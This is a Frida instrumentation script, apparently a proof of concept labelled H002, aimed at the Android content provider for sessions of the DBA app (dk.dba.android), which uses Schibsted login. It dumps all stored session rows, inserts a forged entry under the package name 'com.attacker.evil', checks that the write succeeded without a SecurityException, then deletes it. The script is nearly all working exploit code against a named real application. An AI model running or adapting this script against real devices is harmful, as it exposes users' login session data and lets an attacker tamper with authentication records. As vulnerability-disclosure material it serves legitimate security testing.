import Java from "frida-java-bridge";

function run(): void {
    Java.perform(() => {
        const Uri = Java.use("android.net.Uri");
        const ContentValues = Java.use("android.content.ContentValues");
        const ActivityThread = Java.use("android.app.ActivityThread");
        
        const ctx = ActivityThread.currentApplication().getApplicationContext();
        const resolver = ctx.getContentResolver();
        const uri = Uri.parse("content://dk.dba.android.contentprovider/sessions");
        
        // Query before insert
        try {
            const cursor = resolver.query(uri, null, null, ["https://login.schibsted.com"], null);
            if (cursor !== null) {
                const count = cursor.getCount();
                console.log("[H002-QUERY] Row count before insert: " + count);
                if (count > 0) {
                    cursor.moveToFirst();
                    const cols = cursor.getColumnNames();
                    console.log("[H002-QUERY] Columns: " + cols.join(", "));
                    do {
                        let row = "";
                        for (let i = 0; i < cols.length; i++) {
                            row += cols[i] + "=" + cursor.getString(i) + " | ";
                        }
                        console.log("[H002-QUERY] ROW: " + row);
                    } while (cursor.moveToNext());
                } else {
                    console.log("[H002-QUERY] Table is empty - no active sessions");
                }
                cursor.close();
            }
        } catch (e: any) {
            console.log("[H002-QUERY-ERROR] " + e);
        }
        
        // Insert fake entry
        try {
            const cv = ContentValues.$new();
            cv.put("packageName", "com.attacker.evil");
            cv.put("serverUrl", "https://login.schibsted.com");
            const resultUri = resolver.insert(uri, cv);
            console.log("[H002-INSERT] SUCCESS - no SecurityException. resultUri=" + (resultUri !== null ? resultUri.toString() : "null"));
        } catch (e: any) {
            console.log("[H002-INSERT-ERROR] " + e);
        }
        
        // Re-query to verify
        try {
            const cursor2 = resolver.query(uri, null, null, ["https://login.schibsted.com"], null);
            if (cursor2 !== null) {
                const count2 = cursor2.getCount();
                console.log("[H002-VERIFY] Row count after insert: " + count2);
                if (count2 > 0) {
                    cursor2.moveToFirst();
                    const cols2 = cursor2.getColumnNames();
                    do {
                        let row2 = "";
                        for (let i = 0; i < cols2.length; i++) {
                            row2 += cols2[i] + "=" + cursor2.getString(i) + " | ";
                        }
                        console.log("[H002-VERIFY] ROW: " + row2);
                    } while (cursor2.moveToNext());
                }
                cursor2.close();
            }
        } catch (e: any) {
            console.log("[H002-VERIFY-ERROR] " + e);
        }
        
        // Delete the injected entry
        try {
            const delCount = resolver.delete(uri, null, ["com.attacker.evil"]);
            console.log("[H002-DELETE] Rows deleted: " + delCount);
        } catch (e: any) {
            console.log("[H002-DELETE-ERROR] " + e);
        }
        
        // Final count
        try {
            const cursor3 = resolver.query(uri, null, null, ["https://login.schibsted.com"], null);
            if (cursor3 !== null) {
                console.log("[H002-FINAL] Row count after delete: " + cursor3.getCount());
                cursor3.close();
            }
        } catch (e: any) {
            console.log("[H002-FINAL-ERROR] " + e);
        }
        
        console.log("[H002-DONE] All ContentProvider CRUD operations completed without SecurityException");
    });
}

run();
